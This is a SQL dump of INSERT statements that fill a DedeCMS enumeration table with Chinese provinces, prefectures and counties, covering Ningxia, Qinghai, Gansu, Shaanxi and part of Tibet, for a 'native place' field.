INSERT INTO dede_sys_enum VALUES ('19879', '西夏区', '15501.2', 'nativeplace', '15501', '2');
INSERT INTO dede_sys_enum VALUES ('19878', '兴庆区', '15501.1', 'nativeplace', '15501', '2');
INSERT INTO dede_sys_enum VALUES ('19877', '银川市', '15501', 'nativeplace', '15501', '1');
INSERT INTO dede_sys_enum VALUES ('19876', '宁夏回族自治区', '15500', 'nativeplace', '15500', '0');
INSERT INTO dede_sys_enum VALUES ('19875', '天峻县', '15008.5', 'nativeplace', '15009', '2');
INSERT INTO dede_sys_enum VALUES ('19874', '都兰县', '15008.4', 'nativeplace', '15008', '2');
INSERT INTO dede_sys_enum VALUES ('19873', '乌兰县', '15008.3', 'nativeplace', '15008', '2');
INSERT INTO dede_sys_enum VALUES ('19872', '德令哈市', '15008.2', 'nativeplace', '15008', '2');
INSERT INTO dede_sys_enum VALUES ('19871', '格尔木市', '15008.1', 'nativeplace', '15008', '2');
INSERT INTO dede_sys_enum VALUES ('19870', '海西蒙古族藏族自治州', '15008', 'nativeplace', '15008', '1');
INSERT INTO dede_sys_enum VALUES ('19869', '曲麻莱县', '15007.6', 'nativeplace', '15008', '2');
INSERT INTO dede_sys_enum VALUES ('19868', '囊谦县', '15007.5', 'nativeplace', '15008', '2');
INSERT INTO dede_sys_enum VALUES ('19867', '治多县', '15007.4', 'nativeplace', '15007', '2');
INSERT INTO dede_sys_enum VALUES ('19866', '称多县', '15007.3', 'nativeplace', '15007', '2');
INSERT INTO dede_sys_enum VALUES ('19865', '杂多县', '15007.2', 'nativeplace', '15007', '2');
INSERT INTO dede_sys_enum VALUES ('19864', '玉树县', '15007.1', 'nativeplace', '15007', '2');
INSERT INTO dede_sys_enum VALUES ('19863', '玉树藏族自治州', '15007', 'nativeplace', '15007', '1');
INSERT INTO dede_sys_enum VALUES ('19862', '玛多县', '15006.6', 'nativeplace', '15007', '2');
INSERT INTO dede_sys_enum VALUES ('19861', '久治县', '15006.5', 'nativeplace', '15007', '2');
INSERT INTO dede_sys_enum VALUES ('19860', '达日县', '15006.4', 'nativeplace', '15006', '2');
INSERT INTO dede_sys_enum VALUES ('19859', '甘德县', '15006.3', 'nativeplace', '15006', '2');
INSERT INTO dede_sys_enum VALUES ('19858', '班玛县', '15006.2', 'nativeplace', '15006', '2');
INSERT INTO dede_sys_enum VALUES ('19857', '玛沁县', '15006.1', 'nativeplace', '15006', '2');
INSERT INTO dede_sys_enum VALUES ('19856', '果洛藏族自治州', '15006', 'nativeplace', '15006', '1');
INSERT INTO dede_sys_enum VALUES ('19855', '贵南县', '15005.5', 'nativeplace', '15006', '2');
INSERT INTO dede_sys_enum VALUES ('19854', '兴海县', '15005.4', 'nativeplace', '15005', '2');
INSERT INTO dede_sys_enum VALUES ('19853', '贵德县', '15005.3', 'nativeplace', '15005', '2');
INSERT INTO dede_sys_enum VALUES ('19852', '同德县', '15005.2', 'nativeplace', '15005', '2');
INSERT INTO dede_sys_enum VALUES ('19851', '共和县', '15005.1', 'nativeplace', '15005', '2');
INSERT INTO dede_sys_enum VALUES ('19850', '海南藏族自治州', '15005', 'nativeplace', '15005', '1');
INSERT INTO dede_sys_enum VALUES ('19849', '河南蒙古族自治县', '15004.4', 'nativeplace', '15004', '2');
INSERT INTO dede_sys_enum VALUES ('19848', '泽库县', '15004.3', 'nativeplace', '15004', '2');
INSERT INTO dede_sys_enum VALUES ('19847', '尖扎县', '15004.2', 'nativeplace', '15004', '2');
INSERT INTO dede_sys_enum VALUES ('19846', '同仁县', '15004.1', 'nativeplace', '15004', '2');
INSERT INTO dede_sys_enum VALUES ('19845', '黄南藏族自治州', '15004', 'nativeplace', '15004', '1');
INSERT INTO dede_sys_enum VALUES ('19844', '刚察县', '15003.4', 'nativeplace', '15003', '2');
INSERT INTO dede_sys_enum VALUES ('19843', '海晏县', '15003.3', 'nativeplace', '15003', '2');
INSERT INTO dede_sys_enum VALUES ('19842', '祁连县', '15003.2', 'nativeplace', '15003', '2');
INSERT INTO dede_sys_enum VALUES ('19841', '门源回族自治县', '15003.1', 'nativeplace', '15003', '2');
INSERT INTO dede_sys_enum VALUES ('19840', '海北藏族自治州', '15003', 'nativeplace', '15003', '1');
INSERT INTO dede_sys_enum VALUES ('19839', '循化撒拉族自治县', '15002.6', 'nativeplace', '15003', '2');
INSERT INTO dede_sys_enum VALUES ('19838', '化隆回族自治县', '15002.5', 'nativeplace', '15003', '2');
INSERT INTO dede_sys_enum VALUES ('19837', '互助土族自治县', '15002.4', 'nativeplace', '15002', '2');
INSERT INTO dede_sys_enum VALUES ('19836', '乐都县', '15002.3', 'nativeplace', '15002', '2');
INSERT INTO dede_sys_enum VALUES ('19835', '民和回族土族自治县', '15002.2', 'nativeplace', '15002', '2');
INSERT INTO dede_sys_enum VALUES ('19834', '平安县', '15002.1', 'nativeplace', '15002', '2');
INSERT INTO dede_sys_enum VALUES ('19833', '海东地区', '15002', 'nativeplace', '15002', '1');
INSERT INTO dede_sys_enum VALUES ('19832', '湟源县', '15001.7', 'nativeplace', '15002', '2');
INSERT INTO dede_sys_enum VALUES ('19831', '湟中县', '15001.6', 'nativeplace', '15002', '2');
INSERT INTO dede_sys_enum VALUES ('19830', '大通回族土族自治县', '15001.5', 'nativeplace', '15002', '2');
INSERT INTO dede_sys_enum VALUES ('19829', '城北区', '15001.4', 'nativeplace', '15001', '2');
INSERT INTO dede_sys_enum VALUES ('19828', '城西区', '15001.3', 'nativeplace', '15001', '2');
INSERT INTO dede_sys_enum VALUES ('19827', '城中区', '15001.2', 'nativeplace', '15001', '2');
INSERT INTO dede_sys_enum VALUES ('19826', '城东区', '15001.1', 'nativeplace', '15001', '2');
INSERT INTO dede_sys_enum VALUES ('19825', '西宁市', '15001', 'nativeplace', '15001', '1');
INSERT INTO dede_sys_enum VALUES ('19824', '青海省', '15000', 'nativeplace', '15000', '0');
INSERT INTO dede_sys_enum VALUES ('19823', '夏河县', '14514.8', 'nativeplace', '14515', '2');
INSERT INTO dede_sys_enum VALUES ('19822', '碌曲县', '14514.7', 'nativeplace', '14515', '2');
INSERT INTO dede_sys_enum VALUES ('19821', '玛曲县', '14514.6', 'nativeplace', '14515', '2');
INSERT INTO dede_sys_enum VALUES ('19820', '迭部县', '14514.5', 'nativeplace', '14515', '2');
INSERT INTO dede_sys_enum VALUES ('19819', '舟曲县', '14514.4', 'nativeplace', '14514', '2');
INSERT INTO dede_sys_enum VALUES ('19818', '卓尼县', '14514.3', 'nativeplace', '14514', '2');
INSERT INTO dede_sys_enum VALUES ('19817', '临潭县', '14514.2', 'nativeplace', '14514', '2');
INSERT INTO dede_sys_enum VALUES ('19816', '合作市', '14514.1', 'nativeplace', '14514', '2');
INSERT INTO dede_sys_enum VALUES ('19815', '甘南藏族自治州', '14514', 'nativeplace', '14514', '1');
INSERT INTO dede_sys_enum VALUES ('19814', '积石山保安族东乡族撒拉族自治县', '14513.8', 'nativeplace', '14514', '2');
INSERT INTO dede_sys_enum VALUES ('19813', '东乡族自治县', '14513.7', 'nativeplace', '14514', '2');
INSERT INTO dede_sys_enum VALUES ('19812', '和政县', '14513.6', 'nativeplace', '14514', '2');
INSERT INTO dede_sys_enum VALUES ('19811', '广河县', '14513.5', 'nativeplace', '14514', '2');
INSERT INTO dede_sys_enum VALUES ('19810', '永靖县', '14513.4', 'nativeplace', '14513', '2');
INSERT INTO dede_sys_enum VALUES ('19809', '康乐县', '14513.3', 'nativeplace', '14513', '2');
INSERT INTO dede_sys_enum VALUES ('19808', '临夏县', '14513.2', 'nativeplace', '14513', '2');
INSERT INTO dede_sys_enum VALUES ('19807', '临夏市', '14513.1', 'nativeplace', '14513', '2');
INSERT INTO dede_sys_enum VALUES ('19806', '临夏回族自治州', '14513', 'nativeplace', '14513', '1');
INSERT INTO dede_sys_enum VALUES ('19805', '两当县', '14512.9', 'nativeplace', '14513', '2');
INSERT INTO dede_sys_enum VALUES ('19804', '徽　县', '14512.8', 'nativeplace', '14513', '2');
INSERT INTO dede_sys_enum VALUES ('19803', '礼　县', '14512.7', 'nativeplace', '14513', '2');
INSERT INTO dede_sys_enum VALUES ('19802', '西和县', '14512.6', 'nativeplace', '14513', '2');
INSERT INTO dede_sys_enum VALUES ('19801', '康　县', '14512.5', 'nativeplace', '14513', '2');
INSERT INTO dede_sys_enum VALUES ('19800', '宕昌县', '14512.4', 'nativeplace', '14512', '2');
INSERT INTO dede_sys_enum VALUES ('19799', '文　县', '14512.3', 'nativeplace', '14512', '2');
INSERT INTO dede_sys_enum VALUES ('19798', '成　县', '14512.2', 'nativeplace', '14512', '2');
INSERT INTO dede_sys_enum VALUES ('19797', '武都区', '14512.1', 'nativeplace', '14512', '2');
INSERT INTO dede_sys_enum VALUES ('19796', '陇南市', '14512', 'nativeplace', '14512', '1');
INSERT INTO dede_sys_enum VALUES ('19795', '岷　县', '14511.7', 'nativeplace', '14512', '2');
INSERT INTO dede_sys_enum VALUES ('19794', '漳　县', '14511.6', 'nativeplace', '14512', '2');
INSERT INTO dede_sys_enum VALUES ('19793', '临洮县', '14511.5', 'nativeplace', '14512', '2');
INSERT INTO dede_sys_enum VALUES ('19792', '渭源县', '14511.4', 'nativeplace', '14511', '2');
INSERT INTO dede_sys_enum VALUES ('19791', '陇西县', '14511.3', 'nativeplace', '14511', '2');
INSERT INTO dede_sys_enum VALUES ('19790', '通渭县', '14511.2', 'nativeplace', '14511', '2');
INSERT INTO dede_sys_enum VALUES ('19789', '安定区', '14511.1', 'nativeplace', '14511', '2');
INSERT INTO dede_sys_enum VALUES ('19788', '定西市', '14511', 'nativeplace', '14511', '1');
INSERT INTO dede_sys_enum VALUES ('19787', '镇原县', '14510.8', 'nativeplace', '14511', '2');
INSERT INTO dede_sys_enum VALUES ('19786', '宁　县', '14510.7', 'nativeplace', '14511', '2');
INSERT INTO dede_sys_enum VALUES ('19785', '正宁县', '14510.6', 'nativeplace', '14511', '2');
INSERT INTO dede_sys_enum VALUES ('19784', '合水县', '14510.5', 'nativeplace', '14511', '2');
INSERT INTO dede_sys_enum VALUES ('19783', '华池县', '14510.4', 'nativeplace', '14510', '2');
INSERT INTO dede_sys_enum VALUES ('19782', '环　县', '14510.3', 'nativeplace', '14510', '2');
INSERT INTO dede_sys_enum VALUES ('19781', '庆城县', '14510.2', 'nativeplace', '14510', '2');
INSERT INTO dede_sys_enum VALUES ('19780', '西峰区', '14510.1', 'nativeplace', '14510', '2');
INSERT INTO dede_sys_enum VALUES ('19779', '庆阳市', '14510', 'nativeplace', '14510', '1');
INSERT INTO dede_sys_enum VALUES ('19778', '敦煌市', '14509.7', 'nativeplace', '14510', '2');
INSERT INTO dede_sys_enum VALUES ('19777', '玉门市', '14509.6', 'nativeplace', '14510', '2');
INSERT INTO dede_sys_enum VALUES ('19776', '阿克塞哈萨克族自治县', '14509.5', 'nativeplace', '14510', '2');
INSERT INTO dede_sys_enum VALUES ('19775', '肃北蒙古族自治县', '14509.4', 'nativeplace', '14509', '2');
INSERT INTO dede_sys_enum VALUES ('19774', '安西县', '14509.3', 'nativeplace', '14509', '2');
INSERT INTO dede_sys_enum VALUES ('19773', '金塔县', '14509.2', 'nativeplace', '14509', '2');
INSERT INTO dede_sys_enum VALUES ('19772', '肃州区', '14509.1', 'nativeplace', '14509', '2');
INSERT INTO dede_sys_enum VALUES ('19771', '酒泉市', '14509', 'nativeplace', '14509', '1');
INSERT INTO dede_sys_enum VALUES ('19770', '静宁县', '14508.7', 'nativeplace', '14509', '2');
INSERT INTO dede_sys_enum VALUES ('19769', '庄浪县', '14508.6', 'nativeplace', '14509', '2');
INSERT INTO dede_sys_enum VALUES ('19768', '华亭县', '14508.5', 'nativeplace', '14509', '2');
INSERT INTO dede_sys_enum VALUES ('19767', '崇信县', '14508.4', 'nativeplace', '14508', '2');
INSERT INTO dede_sys_enum VALUES ('19766', '灵台县', '14508.3', 'nativeplace', '14508', '2');
INSERT INTO dede_sys_enum VALUES ('19765', '泾川县', '14508.2', 'nativeplace', '14508', '2');
INSERT INTO dede_sys_enum VALUES ('19764', '崆峒区', '14508.1', 'nativeplace', '14508', '2');
INSERT INTO dede_sys_enum VALUES ('19763', '平凉市', '14508', 'nativeplace', '14508', '1');
INSERT INTO dede_sys_enum VALUES ('19762', '山丹县', '14507.6', 'nativeplace', '14508', '2');
INSERT INTO dede_sys_enum VALUES ('19761', '高台县', '14507.5', 'nativeplace', '14508', '2');
INSERT INTO dede_sys_enum VALUES ('19760', '临泽县', '14507.4', 'nativeplace', '14507', '2');
INSERT INTO dede_sys_enum VALUES ('19759', '民乐县', '14507.3', 'nativeplace', '14507', '2');
INSERT INTO dede_sys_enum VALUES ('19758', '肃南裕固族自治县', '14507.2', 'nativeplace', '14507', '2');
INSERT INTO dede_sys_enum VALUES ('19757', '甘州区', '14507.1', 'nativeplace', '14507', '2');
INSERT INTO dede_sys_enum VALUES ('19756', '张掖市', '14507', 'nativeplace', '14507', '1');
INSERT INTO dede_sys_enum VALUES ('19755', '天祝藏族自治县', '14506.4', 'nativeplace', '14506', '2');
INSERT INTO dede_sys_enum VALUES ('19754', '古浪县', '14506.3', 'nativeplace', '14506', '2');
INSERT INTO dede_sys_enum VALUES ('19753', '民勤县', '14506.2', 'nativeplace', '14506', '2');
INSERT INTO dede_sys_enum VALUES ('19752', '凉州区', '14506.1', 'nativeplace', '14506', '2');
INSERT INTO dede_sys_enum VALUES ('19751', '武威市', '14506', 'nativeplace', '14506', '1');
INSERT INTO dede_sys_enum VALUES ('19750', '张家川回族自治县', '14505.7', 'nativeplace', '14506', '2');
INSERT INTO dede_sys_enum VALUES ('19749', '武山县', '14505.6', 'nativeplace', '14506', '2');
INSERT INTO dede_sys_enum VALUES ('19748', '甘谷县', '14505.5', 'nativeplace', '14506', '2');
INSERT INTO dede_sys_enum VALUES ('19747', '秦安县', '14505.4', 'nativeplace', '14505', '2');
INSERT INTO dede_sys_enum VALUES ('19746', '清水县', '14505.3', 'nativeplace', '14505', '2');
INSERT INTO dede_sys_enum VALUES ('19745', '北道区', '14505.2', 'nativeplace', '14505', '2');
INSERT INTO dede_sys_enum VALUES ('19744', '秦城区', '14505.1', 'nativeplace', '14505', '2');
INSERT INTO dede_sys_enum VALUES ('19743', '天水市', '14505', 'nativeplace', '14505', '1');
INSERT INTO dede_sys_enum VALUES ('19742', '景泰县', '14504.5', 'nativeplace', '14505', '2');
INSERT INTO dede_sys_enum VALUES ('19741', '会宁县', '14504.4', 'nativeplace', '14504', '2');
INSERT INTO dede_sys_enum VALUES ('19740', '靖远县', '14504.3', 'nativeplace', '14504', '2');
INSERT INTO dede_sys_enum VALUES ('19739', '平川区', '14504.2', 'nativeplace', '14504', '2');
INSERT INTO dede_sys_enum VALUES ('19738', '白银区', '14504.1', 'nativeplace', '14504', '2');
INSERT INTO dede_sys_enum VALUES ('19737', '白银市', '14504', 'nativeplace', '14504', '1');
INSERT INTO dede_sys_enum VALUES ('19736', '永昌县', '14503.2', 'nativeplace', '14503', '2');
INSERT INTO dede_sys_enum VALUES ('19735', '金川区', '14503.1', 'nativeplace', '14503', '2');
INSERT INTO dede_sys_enum VALUES ('19734', '金昌市', '14503', 'nativeplace', '14503', '1');
INSERT INTO dede_sys_enum VALUES ('19733', '嘉峪关市', '14502', 'nativeplace', '14502', '1');
INSERT INTO dede_sys_enum VALUES ('19732', '榆中县', '14501.8', 'nativeplace', '14502', '2');
INSERT INTO dede_sys_enum VALUES ('19731', '皋兰县', '14501.7', 'nativeplace', '14502', '2');
INSERT INTO dede_sys_enum VALUES ('19730', '永登县', '14501.6', 'nativeplace', '14502', '2');
INSERT INTO dede_sys_enum VALUES ('19729', '红古区', '14501.5', 'nativeplace', '14502', '2');
INSERT INTO dede_sys_enum VALUES ('19728', '安宁区', '14501.4', 'nativeplace', '14501', '2');
INSERT INTO dede_sys_enum VALUES ('19727', '西固区', '14501.3', 'nativeplace', '14501', '2');
INSERT INTO dede_sys_enum VALUES ('19726', '七里河区', '14501.2', 'nativeplace', '14501', '2');
INSERT INTO dede_sys_enum VALUES ('19725', '城关区', '14501.1', 'nativeplace', '14501', '2');
INSERT INTO dede_sys_enum VALUES ('19724', '兰州市', '14501', 'nativeplace', '14501', '1');
INSERT INTO dede_sys_enum VALUES ('19723', '甘肃省', '14500', 'nativeplace', '14500', '0');
INSERT INTO dede_sys_enum VALUES ('19722', '柞水县', '14010.7', 'nativeplace', '14011', '2');
INSERT INTO dede_sys_enum VALUES ('19721', '镇安县', '14010.6', 'nativeplace', '14011', '2');
INSERT INTO dede_sys_enum VALUES ('19720', '山阳县', '14010.5', 'nativeplace', '14011', '2');
INSERT INTO dede_sys_enum VALUES ('19719', '商南县', '14010.4', 'nativeplace', '14010', '2');
INSERT INTO dede_sys_enum VALUES ('19718', '丹凤县', '14010.3', 'nativeplace', '14010', '2');
INSERT INTO dede_sys_enum VALUES ('19717', '洛南县', '14010.2', 'nativeplace', '14010', '2');
INSERT INTO dede_sys_enum VALUES ('19716', '商州区', '14010.1', 'nativeplace', '14010', '2');
INSERT INTO dede_sys_enum VALUES ('19715', '商洛市', '14010', 'nativeplace', '14010', '1');
INSERT INTO dede_sys_enum VALUES ('19714', '白河县', '14009.10', 'nativeplace', '14009', '2');
INSERT INTO dede_sys_enum VALUES ('19713', '旬阳县', '14009.9', 'nativeplace', '14010', '2');
INSERT INTO dede_sys_enum VALUES ('19712', '镇坪县', '14009.8', 'nativeplace', '14010', '2');
INSERT INTO dede_sys_enum VALUES ('19711', '平利县', '14009.7', 'nativeplace', '14010', '2');
INSERT INTO dede_sys_enum VALUES ('19710', '岚皋县', '14009.6', 'nativeplace', '14010', '2');
INSERT INTO dede_sys_enum VALUES ('19709', '紫阳县', '14009.5', 'nativeplace', '14010', '2');
INSERT INTO dede_sys_enum VALUES ('19708', '宁陕县', '14009.4', 'nativeplace', '14009', '2');
INSERT INTO dede_sys_enum VALUES ('19707', '石泉县', '14009.3', 'nativeplace', '14009', '2');
INSERT INTO dede_sys_enum VALUES ('19706', '汉阴县', '14009.2', 'nativeplace', '14009', '2');
INSERT INTO dede_sys_enum VALUES ('19705', '汉滨区', '14009.1', 'nativeplace', '14009', '2');
INSERT INTO dede_sys_enum VALUES ('19704', '安康市', '14009', 'nativeplace', '14009', '1');
INSERT INTO dede_sys_enum VALUES ('19703', '子洲县', '14008.12', 'nativeplace', '14008', '2');
INSERT INTO dede_sys_enum VALUES ('19702', '清涧县', '14008.11', 'nativeplace', '14008', '2');
INSERT INTO dede_sys_enum VALUES ('19701', '吴堡县', '14008.10', 'nativeplace', '14008', '2');
INSERT INTO dede_sys_enum VALUES ('19700', '佳　县', '14008.9', 'nativeplace', '14009', '2');
INSERT INTO dede_sys_enum VALUES ('19699', '米脂县', '14008.8', 'nativeplace', '14009', '2');
INSERT INTO dede_sys_enum VALUES ('19698', '绥德县', '14008.7', 'nativeplace', '14009', '2');
INSERT INTO dede_sys_enum VALUES ('19697', '定边县', '14008.6', 'nativeplace', '14009', '2');
INSERT INTO dede_sys_enum VALUES ('19696', '靖边县', '14008.5', 'nativeplace', '14009', '2');
INSERT INTO dede_sys_enum VALUES ('19695', '横山县', '14008.4', 'nativeplace', '14008', '2');
INSERT INTO dede_sys_enum VALUES ('19694', '府谷县', '14008.3', 'nativeplace', '14008', '2');
INSERT INTO dede_sys_enum VALUES ('19693', '神木县', '14008.2', 'nativeplace', '14008', '2');
INSERT INTO dede_sys_enum VALUES ('19692', '榆阳区', '14008.1', 'nativeplace', '14008', '2');
INSERT INTO dede_sys_enum VALUES ('19691', '榆林市', '14008', 'nativeplace', '14008', '1');
INSERT INTO dede_sys_enum VALUES ('19690', '佛坪县', '14007.11', 'nativeplace', '14007', '2');
INSERT INTO dede_sys_enum VALUES ('19689', '留坝县', '14007.10', 'nativeplace', '14007', '2');
INSERT INTO dede_sys_enum VALUES ('19688', '镇巴县', '14007.9', 'nativeplace', '14008', '2');
INSERT INTO dede_sys_enum VALUES ('19687', '略阳县', '14007.8', 'nativeplace', '14008', '2');
INSERT INTO dede_sys_enum VALUES ('19686', '宁强县', '14007.7', 'nativeplace', '14008', '2');
INSERT INTO dede_sys_enum VALUES ('19685', '勉　县', '14007.6', 'nativeplace', '14008', '2');
INSERT INTO dede_sys_enum VALUES ('19684', '西乡县', '14007.5', 'nativeplace', '14008', '2');
INSERT INTO dede_sys_enum VALUES ('19683', '洋　县', '14007.4', 'nativeplace', '14007', '2');
INSERT INTO dede_sys_enum VALUES ('19682', '城固县', '14007.3', 'nativeplace', '14007', '2');
INSERT INTO dede_sys_enum VALUES ('19681', '南郑县', '14007.2', 'nativeplace', '14007', '2');
INSERT INTO dede_sys_enum VALUES ('19680', '汉台区', '14007.1', 'nativeplace', '14007', '2');
INSERT INTO dede_sys_enum VALUES ('19679', '汉中市', '14007', 'nativeplace', '14007', '1');
INSERT INTO dede_sys_enum VALUES ('19678', '黄陵县', '14006.13', 'nativeplace', '14006', '2');
INSERT INTO dede_sys_enum VALUES ('19677', '黄龙县', '14006.12', 'nativeplace', '14006', '2');
INSERT INTO dede_sys_enum VALUES ('19676', '宜川县', '14006.11', 'nativeplace', '14006', '2');
INSERT INTO dede_sys_enum VALUES ('19675', '洛川县', '14006.10', 'nativeplace', '14006', '2');
INSERT INTO dede_sys_enum VALUES ('19674', '富　县', '14006.9', 'nativeplace', '14007', '2');
INSERT INTO dede_sys_enum VALUES ('19673', '甘泉县', '14006.8', 'nativeplace', '14007', '2');
INSERT INTO dede_sys_enum VALUES ('19672', '吴旗县', '14006.7', 'nativeplace', '14007', '2');
INSERT INTO dede_sys_enum VALUES ('19671', '志丹县', '14006.6', 'nativeplace', '14007', '2');
INSERT INTO dede_sys_enum VALUES ('19670', '安塞县', '14006.5', 'nativeplace', '14007', '2');
INSERT INTO dede_sys_enum VALUES ('19669', '子长县', '14006.4', 'nativeplace', '14006', '2');
INSERT INTO dede_sys_enum VALUES ('19668', '延川县', '14006.3', 'nativeplace', '14006', '2');
INSERT INTO dede_sys_enum VALUES ('19667', '延长县', '14006.2', 'nativeplace', '14006', '2');
INSERT INTO dede_sys_enum VALUES ('19666', '宝塔区', '14006.1', 'nativeplace', '14006', '2');
INSERT INTO dede_sys_enum VALUES ('19665', '延安市', '14006', 'nativeplace', '14006', '1');
INSERT INTO dede_sys_enum VALUES ('19664', '华阴市', '14005.11', 'nativeplace', '14005', '2');
INSERT INTO dede_sys_enum VALUES ('19663', '韩城市', '14005.10', 'nativeplace', '14005', '2');
INSERT INTO dede_sys_enum VALUES ('19662', '富平县', '14005.9', 'nativeplace', '14006', '2');
INSERT INTO dede_sys_enum VALUES ('19661', '白水县', '14005.8', 'nativeplace', '14006', '2');
INSERT INTO dede_sys_enum VALUES ('19660', '蒲城县', '14005.7', 'nativeplace', '14006', '2');
INSERT INTO dede_sys_enum VALUES ('19659', '澄城县', '14005.6', 'nativeplace', '14006', '2');
INSERT INTO dede_sys_enum VALUES ('19658', '合阳县', '14005.5', 'nativeplace', '14006', '2');
INSERT INTO dede_sys_enum VALUES ('19657', '大荔县', '14005.4', 'nativeplace', '14005', '2');
INSERT INTO dede_sys_enum VALUES ('19656', '潼关县', '14005.3', 'nativeplace', '14005', '2');
INSERT INTO dede_sys_enum VALUES ('19655', '华　县', '14005.2', 'nativeplace', '14005', '2');
INSERT INTO dede_sys_enum VALUES ('19654', '临渭区', '14005.1', 'nativeplace', '14005', '2');
INSERT INTO dede_sys_enum VALUES ('19653', '渭南市', '14005', 'nativeplace', '14005', '1');
INSERT INTO dede_sys_enum VALUES ('19652', '兴平市', '14004.14', 'nativeplace', '14004', '2');
INSERT INTO dede_sys_enum VALUES ('19651', '武功县', '14004.13', 'nativeplace', '14004', '2');
INSERT INTO dede_sys_enum VALUES ('19650', '淳化县', '14004.12', 'nativeplace', '14004', '2');
INSERT INTO dede_sys_enum VALUES ('19649', '旬邑县', '14004.11', 'nativeplace', '14004', '2');
INSERT INTO dede_sys_enum VALUES ('19648', '长武县', '14004.10', 'nativeplace', '14004', '2');
INSERT INTO dede_sys_enum VALUES ('19647', '彬　县', '14004.9', 'nativeplace', '14005', '2');
INSERT INTO dede_sys_enum VALUES ('19646', '永寿县', '14004.8', 'nativeplace', '14005', '2');
INSERT INTO dede_sys_enum VALUES ('19645', '礼泉县', '14004.7', 'nativeplace', '14005', '2');
INSERT INTO dede_sys_enum VALUES ('19644', '乾　县', '14004.6', 'nativeplace', '14005', '2');
INSERT INTO dede_sys_enum VALUES ('19643', '泾阳县', '14004.5', 'nativeplace', '14005', '2');
INSERT INTO dede_sys_enum VALUES ('19642', '三原县', '14004.4', 'nativeplace', '14004', '2');
INSERT INTO dede_sys_enum VALUES ('19641', '渭城区', '14004.3', 'nativeplace', '14004', '2');
INSERT INTO dede_sys_enum VALUES ('19640', '杨凌区', '14004.2', 'nativeplace', '14004', '2');
INSERT INTO dede_sys_enum VALUES ('19639', '秦都区', '14004.1', 'nativeplace', '14004', '2');
INSERT INTO dede_sys_enum VALUES ('19638', '咸阳市', '14004', 'nativeplace', '14004', '1');
INSERT INTO dede_sys_enum VALUES ('19637', '太白县', '14003.12', 'nativeplace', '14003', '2');
INSERT INTO dede_sys_enum VALUES ('19636', '凤　县', '14003.11', 'nativeplace', '14003', '2');
INSERT INTO dede_sys_enum VALUES ('19635', '麟游县', '14003.10', 'nativeplace', '14003', '2');
INSERT INTO dede_sys_enum VALUES ('19634', '千阳县', '14003.9', 'nativeplace', '14004', '2');
INSERT INTO dede_sys_enum VALUES ('19633', '陇　县', '14003.8', 'nativeplace', '14004', '2');
INSERT INTO dede_sys_enum VALUES ('19632', '眉　县', '14003.7', 'nativeplace', '14004', '2');
INSERT INTO dede_sys_enum VALUES ('19631', '扶风县', '14003.6', 'nativeplace', '14004', '2');
INSERT INTO dede_sys_enum VALUES ('19630', '岐山县', '14003.5', 'nativeplace', '14004', '2');
INSERT INTO dede_sys_enum VALUES ('19629', '凤翔县', '14003.4', 'nativeplace', '14003', '2');
INSERT INTO dede_sys_enum VALUES ('19628', '陈仓区', '14003.3', 'nativeplace', '14003', '2');
INSERT INTO dede_sys_enum VALUES ('19627', '金台区', '14003.2', 'nativeplace', '14003', '2');
INSERT INTO dede_sys_enum VALUES ('19626', '滨区', '14003.1', 'nativeplace', '14003', '2');
INSERT INTO dede_sys_enum VALUES ('19625', '宝鸡市', '14003', 'nativeplace', '14003', '1');
INSERT INTO dede_sys_enum VALUES ('19624', '宜君县', '14002.4', 'nativeplace', '14002', '2');
INSERT INTO dede_sys_enum VALUES ('19623', '耀州区', '14002.3', 'nativeplace', '14002', '2');
INSERT INTO dede_sys_enum VALUES ('19622', '印台区', '14002.2', 'nativeplace', '14002', '2');
INSERT INTO dede_sys_enum VALUES ('19621', '王益区', '14002.1', 'nativeplace', '14002', '2');
INSERT INTO dede_sys_enum VALUES ('19620', '铜川市', '14002', 'nativeplace', '14002', '1');
INSERT INTO dede_sys_enum VALUES ('19619', '高陵县', '14001.13', 'nativeplace', '14001', '2');
INSERT INTO dede_sys_enum VALUES ('19618', '户　县', '14001.12', 'nativeplace', '14001', '2');
INSERT INTO dede_sys_enum VALUES ('19617', '周至县', '14001.11', 'nativeplace', '14001', '2');
INSERT INTO dede_sys_enum VALUES ('19616', '蓝田县', '14001.10', 'nativeplace', '14001', '2');
INSERT INTO dede_sys_enum VALUES ('19615', '长安区', '14001.9', 'nativeplace', '14002', '2');
INSERT INTO dede_sys_enum VALUES ('19614', '临潼区', '14001.8', 'nativeplace', '14002', '2');
INSERT INTO dede_sys_enum VALUES ('19613', '阎良区', '14001.7', 'nativeplace', '14002', '2');
INSERT INTO dede_sys_enum VALUES ('19612', '雁塔区', '14001.6', 'nativeplace', '14002', '2');
INSERT INTO dede_sys_enum VALUES ('19611', '未央区', '14001.5', 'nativeplace', '14002', '2');
INSERT INTO dede_sys_enum VALUES ('19610', '灞桥区', '14001.4', 'nativeplace', '14001', '2');
INSERT INTO dede_sys_enum VALUES ('19609', '莲湖区', '14001.3', 'nativeplace', '14001', '2');
INSERT INTO dede_sys_enum VALUES ('19608', '碑林区', '14001.2', 'nativeplace', '14001', '2');
INSERT INTO dede_sys_enum VALUES ('19607', '新城区', '14001.1', 'nativeplace', '14001', '2');
INSERT INTO dede_sys_enum VALUES ('19606', '西安市', '14001', 'nativeplace', '14001', '1');
INSERT INTO dede_sys_enum VALUES ('19605', '陕西省', '14000', 'nativeplace', '14000', '0');
INSERT INTO dede_sys_enum VALUES ('19604', '朗　县', '13507.7', 'nativeplace', '13508', '2');
INSERT INTO dede_sys_enum VALUES ('19603', '察隅县', '13507.6', 'nativeplace', '13508', '2');
INSERT INTO dede_sys_enum VALUES ('19602', '波密县', '13507.5', 'nativeplace', '13508', '2');
INSERT INTO dede_sys_enum VALUES ('19601', '墨脱县', '13507.4', 'nativeplace', '13507', '2');
INSERT INTO dede_sys_enum VALUES ('19600', '米林县', '13507.3', 'nativeplace', '13507', '2');
INSERT INTO dede_sys_enum VALUES ('19599', '工布江达县', '13507.2', 'nativeplace', '13507', '2');
INSERT INTO dede_sys_enum VALUES ('19598', '林芝县', '13507.1', 'nativeplace', '13507', '2');
INSERT INTO dede_sys_enum VALUES ('19597', '林芝地区', '13507', 'nativeplace', '13507', '1');
INSERT INTO dede_sys_enum VALUES ('19596', '措勤县', '13506.7', 'nativeplace', '13507', '2');
INSERT INTO dede_sys_enum VALUES ('19595', '改则县', '13506.6', 'nativeplace', '13507', '2');
INSERT INTO dede_sys_enum VALUES ('19594', '革吉县', '13506.5', 'nativeplace', '13507', '2');
INSERT INTO dede_sys_enum VALUES ('19593', '日土县', '13506.4', 'nativeplace', '13506', '2');
